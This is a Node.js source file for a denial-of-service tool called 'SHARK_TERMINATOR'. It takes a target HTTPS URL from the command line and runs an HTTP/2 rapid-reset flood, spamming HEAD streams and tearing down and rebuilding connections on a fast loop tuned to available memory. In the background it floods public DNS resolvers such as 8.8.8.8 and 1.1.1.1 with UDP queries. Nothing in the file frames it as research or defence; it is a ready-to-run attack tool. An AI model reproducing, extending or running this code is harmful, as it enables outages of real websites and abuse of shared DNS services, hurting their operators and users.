const http2 = require('http2');
const dgram = require('dgram');
const os = require('os');
const { exec } = require('child_process');

class SHARK_TERMINATOR {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "TERMINATING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // MEMORY-BASED SETTINGS
        this.totalMem = os.totalmem();
        this.freeMem = os.freemem();
        this.memUsage = process.memoryUsage();
        
        // AUTO-SCALE BASED ON MEMORY
        this.resetInterval = this.calculateResetInterval(); // 500-1000ms
        this.connCount = this.calculateConnCount(); // 4-16
        this.streamsPerTick = this.calculateStreamsPerTick();
        
        // PURE H2 RAPID RESET SYSTEM
        this.connectionPool = [];
        this.lastConnectionReset = Date.now();
        this.activeStreams = 0;
        
        // DNS BACKGROUND SPAM
        this.dnsSocket = null;
        this.dnsActive = false;
        this.dnsQueries = 0;
        
        // RESOURCE MONITOR
        this.lastResourceCheck = Date.now();
        this.crashProtectionActive = false;
        
        console.log(`[SHARK] Memory: ${Math.round(this.freeMem / 1024 / 1024)}MB free`);
        console.log(`[SHARK] Auto-config: ${this.connCount} conns, ${this.resetInterval}ms reset`);
    }

    // === MEMORY-BASED AUTO CONFIG ===
    calculateResetInterval() {
        // MORE MEMORY = FASTER RESET (0.1ms - 1000ms)
        const memPercent = this.freeMem / this.totalMem;
        
        if (memPercent > 0.7) return 100; // 0.1s - PLENTY MEMORY
        if (memPercent > 0.5) return 300; // 0.3s
        if (memPercent > 0.3) return 500; // 0.5s
        if (memPercent > 0.2) return 750; // 0.75s
        return 1000; // 1s - LOW MEMORY
    }

    calculateConnCount() {
        // 4-16 CONNECTIONS BASED ON MEMORY
        const memPercent = this.freeMem / this.totalMem;
        
        if (memPercent > 0.7) return 16;
        if (memPercent > 0.5) return 12;
        if (memPercent > 0.3) return 8;
        if (memPercent > 0.2) return 6;
        return 4;
    }

    calculateStreamsPerTick() {
        // STREAMS PER TICK BASED ON MEMORY
        const memPercent = this.freeMem / this.totalMem;
        
        if (memPercent > 0.7) return 50;
        if (memPercent > 0.5) return 30;
        if (memPercent > 0.3) return 15;
        if (memPercent > 0.2) return 8;
        return 4;
    }

    // === PURE H2 RAPID RESET - NO NORMAL REQUESTS ===
    setupConnections() {
        this.connectionPool = [];
        
        for (let i = 0; i < this.connCount; i++) {
            this.createSingleConnection();
        }
    }

    createSingleConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 32768,
                maxDeflateDynamicTableSize: 1048576
            });
            
            client.setMaxListeners(100);
            client.on('error', () => {});
            
            this.connectionPool.push({
                client,
                created: Date.now(),
                lastReset: Date.now()
            });
            
        } catch (err) {
            // SILENT FAIL
        }
    }

    // === RAPID RESET ATTACK ===
    performRapidResetAttack() {
        const now = Date.now();
        
        // RESET EVERY X MS
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // DESTROY ALL CONNECTIONS
            this.connectionPool.forEach(conn => {
                try {
                    // SPAM HEAD REQUESTS DURING DESTRUCTION
                    for (let i = 0; i < this.streamsPerTick; i++) {
                        try {
                            const req = conn.client.request({
                                ':method': 'HEAD',
                                ':path': '/?' + Date.now(),
                                ':authority': this.hostname
                            });
                            
                            req.on('response', () => {
                                this.totalRequests++;
                                this.requestsSinceLastCalc++;
                                req.destroy();
                            });
                            
                            req.on('error', () => {
                                req.destroy();
                            });
                            
                            req.on('close', () => {
                                this.activeStreams--;
                            });
                            
                            this.activeStreams++;
                            req.end();
                            
                        } catch (err) {
                            this.totalRequests++;
                            this.requestsSinceLastCalc++;
                        }
                    }
                    
                    // DESTROY CONNECTION AFTER SPAM
                    conn.client.destroy();
                    
                } catch (err) {}
            });
            
            // CLEAR POOL
            this.connectionPool = [];
            
            // RECREATE IMMEDIATELY
            setTimeout(() => {
                this.setupConnections();
            }, 10);
            
            this.lastConnectionReset = now;
        }
    }

    // === DNS BACKGROUND SPAM ===
    startDNSBackgroundSpam() {
        if (this.dnsActive) return;
        
        this.dnsActive = true;
        this.dnsSocket = dgram.createSocket('udp4');
        
        const dnsQuery = Buffer.from([
            0x00, 0x00, // ID
            0x01, 0x00, // Flags: Standard query
            0x00, 0x01, // Questions: 1
            0x00, 0x00, // Answer RRs: 0
            0x00, 0x00, // Authority RRs: 0
            0x00, 0x00, // Additional RRs: 0
            // Query: example.com
            0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00,
            0x00, 0x01, // Type: A
            0x00, 0x01  // Class: IN
        ]);
        
        // RANDOM DNS SERVERS TO HOLD
        const dnsServers = [
            '8.8.8.8',      // Google
            '1.1.1.1',      // Cloudflare
            '9.9.9.9',      // Quad9
            '208.67.222.222', // OpenDNS
            '8.8.4.4'       // Google Secondary
        ];
        
        const spamDNS = () => {
            if (!this.dnsActive) return;
            
            for (let i = 0; i < 5; i++) {
                const server = dnsServers[Math.floor(Math.random() * dnsServers.length)];
                const port = 53;
                
                try {
                    this.dnsSocket.send(dnsQuery, 0, dnsQuery.length, port, server, (err) => {
                        if (!err) this.dnsQueries++;
                    });
                } catch (err) {}
            }
            
            setTimeout(spamDNS, 10); // FAST SPAM
        };
        
        spamDNS();
        
        this.dnsSocket.on('error', () => {});
    }

    // === RESOURCE PROTECTION ===
    checkResourceUsage() {
        const now = Date.now();
        if (now - this.lastResourceCheck < 5000) return;
        
        this.memUsage = process.memoryUsage();
        this.freeMem = os.freemem();
        
        const memPercent = this.memUsage.heapUsed / this.memUsage.heapTotal;
        
        // CRASH PROTECTION
        if (memPercent > 0.9 && !this.crashProtectionActive) {
            console.log('\n[SHARK] High memory - activating crash protection');
            this.crashProtectionActive = true;
            
            // REDUCE AGGRESSION TEMPORARILY
            const oldReset = this.resetInterval;
            this.resetInterval = Math.min(2000, this.resetInterval * 2);
            
            setTimeout(() => {
                this.crashProtectionActive = false;
                this.resetInterval = oldReset;
                console.log('[SHARK] Crash protection deactivated');
            }, 30000); // 30s COOLDOWN
        }
        
        // AUTO-SCALE BASED ON CURRENT MEMORY
        this.connCount = this.calculateConnCount();
        this.resetInterval = this.calculateResetInterval();
        this.streamsPerTick = this.calculateStreamsPerTick();
        
        // ENSURE CONNECTION COUNT MATCHES
        if (this.connectionPool.length > this.connCount) {
            const excess = this.connectionPool.length - this.connCount;
            for (let i = 0; i < excess; i++) {
                try {
                    this.connectionPool.pop().client.destroy();
                } catch (err) {}
            }
        }
        
        this.lastResourceCheck = now;
    }

    // === STATS ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const memUsage = Math.round(this.memUsage.heapUsed / 1024 / 1024);
        const freeMem = Math.round(this.freeMem / 1024 / 1024);
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`SHARK-LHC — (${runtimeStr}) | STATUS: ${this.status}`);
        console.log('=================================');
        console.log(`SHARK-TRS — ${this.totalRequests}`);
        console.log(`SHARK-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log(`SHARK-DNS — ${this.dnsQueries}`);
        console.log('=================================');
        console.log(`CONNS: ${this.connectionPool.length}/${this.connCount} | STREAMS: ${this.activeStreams}`);
        console.log(`RESET: ${this.resetInterval}ms | MEM: ${memUsage}MB/${freeMem}MB`);
        console.log(`PROTECTION: ${this.crashProtectionActive ? 'ACTIVE' : 'IDLE'}`);
        console.log('=================================');
    }

    // === MAIN ===
    start() {
        console.log('=== SHARK TERMINATOR ===');
        console.log('MODE: PURE RAPID RESET + DNS BACKGROUND');
        console.log('TARGET:', this.targetUrl);
        console.log('='.repeat(50));
        
        // SETUP
        this.setupConnections();
        this.startDNSBackgroundSpam();
        
        // MAIN LOOP
        const mainLoop = setInterval(() => {
            if (!this.running) {
                clearInterval(mainLoop);
                return;
            }
            
            try {
                this.performRapidResetAttack();
                this.checkResourceUsage();
                this.updateDisplay();
            } catch (err) {
                // PREVENT CRASH
                console.log('[SHARK] Error caught, continuing...');
            }
        }, 10); // FAST LOOP
        
        // AUTO-RECOVER
        setInterval(() => {
            if (this.connectionPool.length < this.connCount) {
                const needed = this.connCount - this.connectionPool.length;
                for (let i = 0; i < needed; i++) {
                    this.createSingleConnection();
                }
            }
        }, 5000);
        
        process.on('SIGINT', () => {
            console.log('\n\n=== SHARK TERMINATED ===');
            console.log(`Total Requests: ${this.totalRequests}`);
            console.log(`DNS Queries: ${this.dnsQueries}`);
            console.log(`Peak RPS: ${this.currentRPS.toFixed(1)}`);
            console.log('='.repeat(40));
            
            this.running = false;
            this.dnsActive = false;
            
            if (this.dnsSocket) {
                try { this.dnsSocket.close(); } catch (err) {}
            }
            
            this.connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (err) {}
            });
            
            process.exit(0);
        });
    }
}

// SINGLE INSTANCE LOCK
if (process.env.SHARK_LOCK) {
    console.log('[ERROR] Shark already running!');
    console.log('[INFO] Use only ONE instance for stability');
    process.exit(1);
}

process.env.SHARK_LOCK = 'true';

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node shark-term.js https://target.com');
    process.exit(1);
}

const shark = new SHARK_TERMINATOR(target);
shark.start();
